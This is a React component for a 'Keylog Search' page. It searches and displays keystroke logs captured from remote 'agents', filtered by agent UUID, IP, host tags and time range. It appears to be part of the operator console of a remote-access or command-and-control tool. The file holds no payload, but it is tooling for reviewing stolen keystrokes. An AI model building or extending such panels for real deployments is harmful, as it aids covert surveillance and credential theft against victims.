import React, { useState } from 'react';
import { Link } from 'react-router-dom';
import qs from 'qs';
import { useAxios } from '../../context/AxiosProvider';
import './Search.css';

const Search = () => {
    const axios = useAxios();

    const [q, setQ] = useState('');
    const [uuid, setUuid] = useState('');
    const [ip, setIp] = useState('');
    const [tagsInput, setTagsInput] = useState('');
    const [tagLogic, setTagLogic] = useState('and');
    const [start, setStart] = useState('');
    const [end, setEnd] = useState('');
    const [limit, setLimit] = useState(50);
    const [offset, setOffset] = useState(0);
    const [total, setTotal] = useState(null);
    const [results, setResults] = useState([]);
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState('');
    const [activeContent, setActiveContent] = useState(null);

    const parseTags = (input) => {
        return input
            .split(',')
            .map(t => t.trim())
            .filter(Boolean);
    };

    const fetchResults = async (nextOffset = 0) => {
        setLoading(true);
        setError('');
        try {
            const tags = parseTags(tagsInput);
            const params = {
                ...(q && { q }),
                ...(uuid && { uuid }),
                ...(ip && { ip }),
                ...(start && { start }),
                ...(end && { end }),
                ...(tags.length > 0 && { tag: tags }),
                tag_logic: tagLogic,
                limit,
                offset: nextOffset
            };

            const response = await axios.get('/api/opensearch/keylogs', {
                params,
                paramsSerializer: params => qs.stringify(params, { arrayFormat: 'repeat' })
            });

            const hits = response?.data?.data || [];
            const totalValue = response?.data?.total?.value;
            setResults(hits);
            setTotal(typeof totalValue === 'number' ? totalValue : null);
            setOffset(nextOffset);
        } catch (err) {
            setError(err?.response?.data?.error || err.message || 'Search failed');
        } finally {
            setLoading(false);
        }
    };

    const handleSearch = (e) => {
        e.preventDefault();
        fetchResults(0);
    };

    const hasNextPage = total === null ? results.length === limit : offset + limit < total;

    const handleNext = () => {
        if (!hasNextPage) return;
        const next = offset + limit;
        fetchResults(next);
    };

    const handlePrev = () => {
        const prev = Math.max(0, offset - limit);
        fetchResults(prev);
    };

    const renderTags = (tags) => {
        if (!Array.isArray(tags) || tags.length === 0) {
            return '-';
        }
        return tags.map((t, idx) => {
            const value = t.value ? `:${t.value}` : '';
            const token = `${t.key}${value}`;
            return (
                <button
                    key={`${t.key}-${idx}`}
                    type="button"
                    className="tag-pill"
                    onClick={() => addTagToken(token)}
                    title="Add tag to search"
                >
                    {t.key}{value}
                </button>
            );
        });
    };

    const addTagToken = (token) => {
        const next = tagsInput
            .split(',')
            .map(t => t.trim())
            .filter(Boolean);
        if (!next.includes(token)) {
            next.push(token);
        }
        setTagsInput(next.join(', '));
    };

    const openContent = (hit) => {
        const src = hit?._source || {};
        setActiveContent({
            id: hit?._id || '',
            contents: src.contents || '',
            uuid: src.uuid || '',
            ip: src.ip || '',
            createdAt: src.created_at || ''
        });
    };

    const closeContent = () => {
        setActiveContent(null);
    };

    const formatTimestamp = (ts) => {
        if (!ts) return '';
        const date = new Date(ts);
        if (Number.isNaN(date.getTime())) return ts;
        return date.toLocaleString(undefined, {
            year: 'numeric',
            month: 'short',
            day: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });
    };

    return (
        <div className="search-container">
            <div className="search-header">
                <h1>Keylog Search (Beta)</h1>
                <p className="search-subtitle">Search contents, filter by UUID, IP, tags, and time range.</p>
            </div>

            <form className="search-form" onSubmit={handleSearch}>
                <div className="search-row">
                    <label htmlFor="q">Text</label>
                    <input
                        id="q"
                        type="text"
                        value={q}
                        onChange={e => setQ(e.target.value)}
                        placeholder="Search contents"
                    />
                </div>
                <div className="search-row">
                    <label htmlFor="uuid">UUID</label>
                    <input
                        id="uuid"
                        type="text"
                        value={uuid}
                        onChange={e => setUuid(e.target.value)}
                        placeholder="Agent UUID"
                    />
                </div>
                <div className="search-row">
                    <label htmlFor="ip">IP</label>
                    <input
                        id="ip"
                        type="text"
                        value={ip}
                        onChange={e => setIp(e.target.value)}
                        placeholder="Agent IP"
                    />
                </div>
                <div className="search-row">
                    <label htmlFor="tags">Tags</label>
                    <input
                        id="tags"
                        type="text"
                        value={tagsInput}
                        onChange={e => setTagsInput(e.target.value)}
                        placeholder="os_type:windows, hostname: example.com"
                    />
                </div>
                <div className="search-row">
                    <label htmlFor="tagLogic">Tag Logic</label>
                    <select id="tagLogic" value={tagLogic} onChange={e => setTagLogic(e.target.value)}>
                        <option value="and">AND</option>
                        <option value="or">OR</option>
                    </select>
                </div>
                <div className="search-row">
                    <label htmlFor="start">Start</label>
                    <input
                        id="start"
                        type="datetime-local"
                        value={start}
                        onChange={e => setStart(e.target.value)}
                    />
                </div>
                <div className="search-row">
                    <label htmlFor="end">End</label>
                    <input
                        id="end"
                        type="datetime-local"
                        value={end}
                        onChange={e => setEnd(e.target.value)}
                    />
                </div>
                <div className="search-row">
                    <label htmlFor="limit">Page Size</label>
                    <input
                        id="limit"
                        type="number"
                        min="1"
                        max="500"
                        value={limit}
                        onChange={e => setLimit(Number(e.target.value || 50))}
                    />
                </div>
                <div className="search-actions">
                    <button type="submit" disabled={loading}>
                        {loading ? 'Searching...' : 'Search'}
                    </button>
                </div>
            </form>

            {error && <div className="search-error">{error}</div>}

            <div className="search-results">
                <div className="results-header">
                    <h2>Results</h2>
                    <div className="results-meta">
                        {total !== null && <span>Total: {total}</span>}
                        <span>Offset: {offset}</span>
                    </div>
                </div>
                <div className="table-wrapper">
                    <div className="table-container">
                        <table>
                            <thead>
                                <tr>
                                    <th>Time</th>
                                    <th>UUID</th>
                                    <th>IP</th>
                                    <th>Contents</th>
                                    <th>Tags</th>
                                </tr>
                            </thead>
                            <tbody>
                                {results.length === 0 ? (
                                    <tr>
                                        <td colSpan="5" className="empty-state">
                                            No results
                                        </td>
                                    </tr>
                                ) : (
                                    results.map(hit => {
                                        const src = hit._source || {};
                                        return (
                                            <tr key={hit._id}>
                                                <td>{formatTimestamp(src.created_at)}</td>
                                                <td>
                                                    <Link className="uuid-link" to={`/agent?agt=${src.uuid}`}>
                                                        {src.uuid}
                                                    </Link>
                                                </td>
                                                <td>{src.ip}</td>
                                                <td className="contents-cell">
                                                    <div className="contents-preview">{src.contents}</div>
                                                    <button
                                                        type="button"
                                                        className="contents-button"
                                                        onClick={() => openContent(hit)}
                                                    >
                                                        View
                                                    </button>
                                                </td>
                                                <td className="tags-cell">{renderTags(src.tags)}</td>
                                            </tr>
                                        );
                                    })
                                )}
                            </tbody>
                        </table>
                    </div>
                </div>
                <div className="pagination-controls">
                    <button onClick={handlePrev} disabled={offset === 0 || loading}>Prev</button>
                    <button onClick={handleNext} disabled={loading || !hasNextPage}>Next</button>
                </div>
            </div>
            {activeContent && (
                <div className="content-modal" onClick={closeContent}>
                    <div className="content-modal-card" onClick={(e) => e.stopPropagation()}>
                        <div className="content-modal-header">
                            <div>
                                <div className="content-modal-title">Keylog Contents</div>
                                <div className="content-modal-meta">
                                    <span>{formatTimestamp(activeContent.createdAt)}</span>
                                    <span>{activeContent.ip}</span>
                                    <span>{activeContent.uuid}</span>
                                </div>
                            </div>
                            <button type="button" className="content-modal-close" onClick={closeContent}>
                                Close
                            </button>
                        </div>
                        <pre className="content-modal-body">{activeContent.contents}</pre>
                    </div>
                </div>
            )}
        </div>
    );
};

export default Search;
